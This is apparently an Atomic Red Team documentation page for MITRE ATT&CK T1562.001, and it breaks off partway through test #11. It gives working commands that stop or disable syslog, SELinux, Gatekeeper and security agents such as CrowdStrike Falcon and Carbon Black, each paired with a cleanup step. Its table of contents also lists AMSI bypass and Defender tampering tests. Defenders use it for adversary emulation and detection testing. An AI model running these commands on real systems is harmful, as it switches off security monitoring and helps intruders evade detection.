<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-45-amsi-bypass-override-amsi-via-comwith-administrative-rights-an-adversary-can-disable-amsi-via-registry-value-in-hkcu-software-classes-clsid-fdb00e52-a214-4aa1-8fba-4357bb0072ec-by-overriding-the-microsoft-defender-com-object-for-amsi-and-points-it-to-a-dll-that-does-not-exist">Atomic Test #45 - AMSI Bypass - Override AMSI via COMWith administrative rights, an adversary can disable AMSI via registry value in HKCU\Software\Classes\CLSID{fdb00e52-a214-4aa1-8fba-4357bb0072ec} by overriding the Microsoft Defender COM object for AMSI and points it to a DLL that does not exist.</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id68">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-46-aws-guardduty-suspension-or-deletion">Atomic Test #46 - AWS - GuardDuty Suspension or Deletion</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#dependencies-run-with-bash">Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">bash</span></code>!</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-check-if-aws-credentials-file-has-a-default-stanza-is-configured">Description: Check if ~/.aws/credentials file has a default stanza is configured</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id69">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id70">Get Prereq Commands:</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#attack-commands-run-with-bash">Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">bash</span></code></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id71">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-47-tamper-with-defender-atp-on-linux-macoswith-root-privileges-an-adversary-can-disable-real-time-protection-note-this-test-assumes-defender-is-not-in-passive-mode-and-real-time-protection-is-enabled-the-use-of-a-managed-json-on-linux-or-defender-plist-on-macos-will-prevent-these-changes-tamper-protection-will-also-prevent-this-available-on-macos-but-not-linux-at-the-time-of-writing-installation-of-mdatp-is-a-prerequisite-installation-steps-vary-across-macos-and-linux-distros-see-microsoft-public-documentation-for-instructions-https-learn-microsoft-com-en-us-microsoft-365-security-defender-endpoint-mac-install-manually-view-o365-worldwide-https-learn-microsoft-com-en-us-microsoft-365-security-defender-endpoint-linux-install-manually-view-o365-worldwide">Atomic Test #47 - Tamper with Defender ATP on Linux/MacOSWith root privileges, an adversary can disable real time protection. Note, this test assumes Defender is not in passive mode and real-time protection is enabled. The use of a managed.json on Linux or Defender .plist on MacOS will prevent these changes. Tamper protection will also prevent this (available on MacOS, but not Linux at the time of writing). Installation of MDATP is a prerequisite. Installation steps vary across MacOS and Linux distros. See Microsoft public documentation for instructions: https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/mac-install-manually?view=o365-worldwide https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-install-manually?view=o365-worldwide</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id72">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-48-tamper-with-windows-defender-registry-reg-exedisable-windows-defender-by-tampering-with-windows-defender-registry-using-the-utility-reg-exe">Atomic Test #48 - Tamper with Windows Defender Registry - Reg.exeDisable Windows Defender by tampering with windows defender registry using the utility “reg.exe”</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id73">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-49-tamper-with-windows-defender-registry-powershelldisable-windows-defender-by-tampering-with-windows-defender-registry-through-powershell">Atomic Test #49 - Tamper with Windows Defender Registry - PowershellDisable Windows Defender by tampering with windows defender registry through powershell</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id74">Cleanup:</a></li>
</ul>
</li>
</ul>
</li>
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#detection">Detection</a></li>
</ul>
            </nav>
        </div>
    </div>
</div>

              
                
<div id="searchbox"></div>
                <article class="bd-article">
                  
  <section class="tex2jax_ignore mathjax_ignore" id="t1562-001-disable-or-modify-tools">
<h1>T1562.001 - Disable or Modify Tools<a class="headerlink" href="#t1562-001-disable-or-modify-tools" title="Permalink to this heading">#</a></h1>
<p>Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)</p>
<p>Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to <a class="reference external" href="https://attack.mitre.org/techniques/T1562/006">Indicator Blocking</a>, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls)</p>
<p>Adversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging)</p>
<p>On network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)</p>
<p>In cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.</p>
<p>Furthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)</p>
<p>Additionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. <a class="reference external" href="https://attack.mitre.org/techniques/T1068">Exploitation for Privilege Escalation</a>), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)</p>
<section id="atomic-tests">
<h2>Atomic Tests<a class="headerlink" href="#atomic-tests" title="Permalink to this heading">#</a></h2>
<section id="atomic-test-1-disable-syslog">
<h3>Atomic Test #1 - Disable syslog<a class="headerlink" href="#atomic-test-1-disable-syslog" title="Permalink to this heading">#</a></h3>
<p>Disables syslog collection</p>
<p><strong>Supported Platforms:</strong> linux</p>
<p>Elevation Required (e.g. root or admin)</p>
<section id="dependencies-run-with-sh">
<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code>!<a class="headerlink" href="#dependencies-run-with-sh" title="Permalink to this heading">#</a></h4>
<section id="description-package-with-rsyslog-must-be-on-system">
<h5>Description: Package with rsyslog must be on system<a class="headerlink" href="#description-package-with-rsyslog-must-be-on-system" title="Permalink to this heading">#</a></h5>
</section>
<section id="check-prereq-commands">
<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this heading">#</a></h5>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="k">if</span><span class="w"> </span><span class="o">(</span>rpm<span class="w"> </span>-q<span class="w"> </span>rsyslog<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span>&gt;/dev/null<span class="o">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">(</span>dpkg<span class="w"> </span>-s<span class="w"> </span>rsyslog<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-q<span class="w"> </span>installed<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>/dev/null<span class="p">;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="nb">exit</span><span class="w"> </span><span class="m">0</span><span class="p">;</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span><span class="p">;</span><span class="w"> </span><span class="k">fi</span>
</pre></div>
</div>
</section>
<section id="get-prereq-commands">
<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this heading">#</a></h5>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span><span class="o">(</span>which<span class="w"> </span>yum<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>yum<span class="w"> </span>-y<span class="w"> </span>install<span class="w"> </span>epel-release<span class="w"> </span>rsyslog<span class="o">)||(</span>which<span class="w"> </span>apt-get<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span>rsyslog<span class="o">)</span><span class="w"> </span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">1</span> <span class="n">-GetPreReqs</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="attack-commands-run-with-sh">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code><a class="headerlink" href="#attack-commands-run-with-sh" title="Permalink to this heading">#</a></h4>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>systemctl<span class="w"> </span>stop<span class="w"> </span>rsyslog<span class="w"> </span><span class="p">;</span><span class="w"> </span>systemctl<span class="w"> </span>disable<span class="w"> </span>rsyslog
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">1</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="cleanup">
<h4>Cleanup:<a class="headerlink" href="#cleanup" title="Permalink to this heading">#</a></h4>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>systemctl<span class="w"> </span>start<span class="w"> </span>rsyslog<span class="w"> </span><span class="p">;</span><span class="w"> </span>systemctl<span class="w"> </span><span class="nb">enable</span><span class="w"> </span>rsyslog
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">1</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-2-disable-syslog-freebsd-disables-syslog-collection">
<h3>Atomic Test #2 - Disable syslog (freebsd)Disables syslog collection<a class="headerlink" href="#atomic-test-2-disable-syslog-freebsd-disables-syslog-collection" title="Permalink to this heading">#</a></h3>
<p><strong>Supported Platforms:</strong> linux
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code></p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>service<span class="w"> </span>syslogd<span class="w"> </span>stop
sysrc<span class="w"> </span><span class="nv">syslogd_enable</span><span class="o">=</span><span class="s2">&quot;NO&quot;</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">2</span>
</pre></div>
</div>
</div>
</div>
<section id="id1">
<h4>Cleanup:<a class="headerlink" href="#id1" title="Permalink to this heading">#</a></h4>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sysrc<span class="w"> </span><span class="nv">syslogd_enable</span><span class="o">=</span><span class="s2">&quot;YES&quot;</span>
service<span class="w"> </span>syslogd<span class="w"> </span>start
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">2</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-3-disable-cb-responsedisable-the-cb-response-service">
<h3>Atomic Test #3 - Disable Cb ResponseDisable the Cb Response service<a class="headerlink" href="#atomic-test-3-disable-cb-responsedisable-the-cb-response-service" title="Permalink to this heading">#</a></h3>
<p><strong>Supported Platforms:</strong> linux#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code></p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="k">$(</span>rpm<span class="w"> </span>-q<span class="w"> </span>--queryformat<span class="w"> </span><span class="s1">&#39;%{VERSION}&#39;</span><span class="w"> </span>centos-release<span class="k">)</span><span class="w"> </span>-eq<span class="w"> </span><span class="s2">&quot;6&quot;</span><span class="w"> </span><span class="o">]</span><span class="p">;</span>
<span class="k">then</span>
<span class="w">  </span>service<span class="w"> </span>cbdaemon<span class="w"> </span>stop
<span class="w">  </span>chkconfig<span class="w"> </span>off<span class="w"> </span>cbdaemon
<span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span><span class="k">$(</span>rpm<span class="w"> </span>-q<span class="w"> </span>--queryformat<span class="w"> </span><span class="s1">&#39;%{VERSION}&#39;</span><span class="w"> </span>centos-release<span class="k">)</span><span class="w"> </span>-eq<span class="w"> </span><span class="s2">&quot;7&quot;</span><span class="w"> </span><span class="o">]</span><span class="p">;</span>
<span class="w">  </span>systemctl<span class="w"> </span>stop<span class="w"> </span>cbdaemon
<span class="w">  </span>systemctl<span class="w"> </span>disable<span class="w"> </span>cbdaemon
<span class="k">fi</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">3</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="atomic-test-4-disable-selinux">
<h3>Atomic Test #4 - Disable SELinux<a class="headerlink" href="#atomic-test-4-disable-selinux" title="Permalink to this heading">#</a></h3>
<p>Disables SELinux enforcement</p>
<p><strong>Supported Platforms:</strong> linux</p>
<p>Elevation Required (e.g. root or admin)</p>
<section id="id2">
<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code>!<a class="headerlink" href="#id2" title="Permalink to this heading">#</a></h4>
<section id="description-selinux-must-be-installed">
<h5>Description: SELinux must be installed<a class="headerlink" href="#description-selinux-must-be-installed" title="Permalink to this heading">#</a></h5>
</section>
<section id="id3">
<h5>Check Prereq Commands:<a class="headerlink" href="#id3" title="Permalink to this heading">#</a></h5>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>which<span class="w"> </span>setenforce
</pre></div>
</div>
</section>
<section id="id4">
<h5>Get Prereq Commands:<a class="headerlink" href="#id4" title="Permalink to this heading">#</a></h5>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;SELinux is not installed&quot;</span><span class="p">;</span><span class="w"> </span><span class="nb">exit</span><span class="w"> </span><span class="m">1</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">4</span> <span class="n">-GetPreReqs</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="id5">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code><a class="headerlink" href="#id5" title="Permalink to this heading">#</a></h4>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>setenforce<span class="w"> </span><span class="m">0</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">4</span>
</pre></div>
</div>
</div>
</div>
</section>
<section id="id6">
<h4>Cleanup:<a class="headerlink" href="#id6" title="Permalink to this heading">#</a></h4>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>setenforce<span class="w"> </span><span class="m">1</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">4</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-5-stop-crowdstrike-falcon-on-linuxstop-and-disable-crowdstrike-falcon-on-linux">
<h3>Atomic Test #5 - Stop Crowdstrike Falcon on LinuxStop and disable Crowdstrike Falcon on Linux<a class="headerlink" href="#atomic-test-5-stop-crowdstrike-falcon-on-linuxstop-and-disable-crowdstrike-falcon-on-linux" title="Permalink to this heading">#</a></h3>
<p><strong>Supported Platforms:</strong> linux
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code></p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>systemctl<span class="w"> </span>stop<span class="w"> </span>falcon-sensor.service
sudo<span class="w"> </span>systemctl<span class="w"> </span>disable<span class="w"> </span>falcon-sensor.service
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">5</span>
</pre></div>
</div>
</div>
</div>
<section id="id7">
<h4>Cleanup:<a class="headerlink" href="#id7" title="Permalink to this heading">#</a></h4>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>systemctl<span class="w"> </span><span class="nb">enable</span><span class="w"> </span>falcon-sensor.service
sudo<span class="w"> </span>systemctl<span class="w"> </span>start<span class="w"> </span>falcon-sensor.service
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">5</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-6-disable-carbon-black-responsedisables-carbon-black-response">
<h3>Atomic Test #6 - Disable Carbon Black ResponseDisables Carbon Black Response<a class="headerlink" href="#atomic-test-6-disable-carbon-black-responsedisables-carbon-black-response" title="Permalink to this heading">#</a></h3>
<p><strong>Supported Platforms:</strong> macos
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code></p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>launchctl<span class="w"> </span>unload<span class="w"> </span>/Library/LaunchDaemons/com.carbonblack.daemon.plist
sudo<span class="w"> </span>launchctl<span class="w"> </span>unload<span class="w"> </span>/Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">6</span>
</pre></div>
</div>
</div>
</div>
<section id="id8">
<h4>Cleanup:<a class="headerlink" href="#id8" title="Permalink to this heading">#</a></h4>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>launchctl<span class="w"> </span>load<span class="w"> </span>-w<span class="w"> </span>/Library/LaunchDaemons/com.carbonblack.daemon.plist
sudo<span class="w"> </span>launchctl<span class="w"> </span>load<span class="w"> </span>-w<span class="w"> </span>/Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">6</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-7-disable-littlesnitchdisables-littlesnitch">
<h3>Atomic Test #7 - Disable LittleSnitchDisables LittleSnitch<a class="headerlink" href="#atomic-test-7-disable-littlesnitchdisables-littlesnitch" title="Permalink to this heading">#</a></h3>
<p><strong>Supported Platforms:</strong> macos
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code></p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>launchctl<span class="w"> </span>unload<span class="w"> </span>/Library/LaunchDaemons/at.obdev.littlesnitchd.plist
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">7</span>
</pre></div>
</div>
</div>
</div>
<section id="id9">
<h4>Cleanup:<a class="headerlink" href="#id9" title="Permalink to this heading">#</a></h4>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>launchctl<span class="w"> </span>load<span class="w"> </span>-w<span class="w"> </span>/Library/LaunchDaemons/at.obdev.littlesnitchd.plist
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">7</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-8-disable-opendns-umbrelladisables-opendns-umbrella">
<h3>Atomic Test #8 - Disable OpenDNS UmbrellaDisables OpenDNS Umbrella<a class="headerlink" href="#atomic-test-8-disable-opendns-umbrelladisables-opendns-umbrella" title="Permalink to this heading">#</a></h3>
<p><strong>Supported Platforms:</strong> macos
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code></p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>launchctl<span class="w"> </span>unload<span class="w"> </span>/Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">8</span>
</pre></div>
</div>
</div>
</div>
<section id="id10">
<h4>Cleanup:<a class="headerlink" href="#id10" title="Permalink to this heading">#</a></h4>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>launchctl<span class="w"> </span>load<span class="w"> </span>-w<span class="w"> </span>/Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">8</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-9-disable-macos-gatekeeperdisables-macos-gatekeeper">
<h3>Atomic Test #9 - Disable macOS GatekeeperDisables macOS Gatekeeper<a class="headerlink" href="#atomic-test-9-disable-macos-gatekeeperdisables-macos-gatekeeper" title="Permalink to this heading">#</a></h3>
<p><strong>Supported Platforms:</strong> macos
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code></p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>spctl<span class="w"> </span>--master-disable
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">9</span>
</pre></div>
</div>
</div>
</div>
<section id="id11">
<h4>Cleanup:<a class="headerlink" href="#id11" title="Permalink to this heading">#</a></h4>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>spctl<span class="w"> </span>--master-enable
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">9</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-10-stop-and-unload-crowdstrike-falcon-on-macosstop-and-unload-crowdstrike-falcon-daemons-falcond-and-userdaemon-on-macos">
<h3>Atomic Test #10 - Stop and unload Crowdstrike Falcon on macOSStop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS<a class="headerlink" href="#atomic-test-10-stop-and-unload-crowdstrike-falcon-on-macosstop-and-unload-crowdstrike-falcon-daemons-falcond-and-userdaemon-on-macos" title="Permalink to this heading">#</a></h3>
<p><strong>Supported Platforms:</strong> macos
Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code></p>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>launchctl<span class="w"> </span>unload<span class="w"> </span>/Library/LaunchDaemons/com.crowdstrike.falcond.plist
sudo<span class="w"> </span>launchctl<span class="w"> </span>unload<span class="w"> </span>/Library/LaunchDaemons/com.crowdstrike.userdaemon.plist
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">10</span>
</pre></div>
</div>
</div>
</div>
<section id="id12">
<h4>Cleanup:<a class="headerlink" href="#id12" title="Permalink to this heading">#</a></h4>
<div class="highlight-sh notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>launchctl<span class="w"> </span>load<span class="w"> </span>-w<span class="w"> </span>/Library/LaunchDaemons/com.crowdstrike.falcond.plist
sudo<span class="w"> </span>launchctl<span class="w"> </span>load<span class="w"> </span>-w<span class="w"> </span>/Library/LaunchDaemons/com.crowdstrike.userdaemon.plist
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1562</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">10</span> <span class="n">-Cleanup</span>
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="atomic-test-11-unload-sysmon-filter-driver">
<h3>Atomic Test #11 - Unload Sysmon Filter Driver<a class="headerlink" href="#atomic-test-11-unload-sysmon-filter-driver" title="Permalink to this heading">#</a></h3>
<p>Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution, o verify successful execution,
run the prereq_command’s and it should fail with an error of “sysmon filter must be loaded”.</p>
<p><strong>Supported Platforms:</strong> windows</p>
<p>Elevation Required (e.g. root or admin)</p>
<section id="dependencies-run-with-powershell">
<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this heading">#</a></h4>
<section id="description-sysmon-must-be-downloaded">
<h5>Description: Sysmon must be downloaded<a class="headerlink" href="#description-sysmon-must-be-downloaded" title="Permalink to this heading">#</a></h5>
</section>
<section id="id13">
<h5>Check Prereq Commands:<a class="headerlink" href="#id13" title="Permalink to this heading">#</a></h5>
